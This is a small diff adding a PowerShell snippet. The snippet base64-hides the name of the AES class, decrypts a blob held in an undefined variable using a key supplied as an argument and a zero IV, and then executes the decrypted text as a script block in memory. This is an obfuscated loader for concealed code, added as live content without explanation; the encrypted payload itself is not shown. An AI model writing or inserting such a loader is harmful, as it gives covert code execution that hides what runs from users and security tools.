@@ -1,0 +1,8 @@
+[string] $k=$args[0].ToString().padright(32,'0');
+$o=New-Object([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5BZXNNYW5hZ2VkCg==")));
+$o.KeySize=256;
+$o.Key=[System.Text.Encoding]::UTF8.GetBytes($k);
+$o.IV=@(0)*16;
+$s0=$([System.Convert]::FromBase64String($s));
+$s1=$o.CreateDecryptor().TransformFinalBlock($s0, 0, $s0.Length);
+[ScriptBlock]::Create([System.Text.Encoding]::UTF8.GetString($s1)).Invoke();
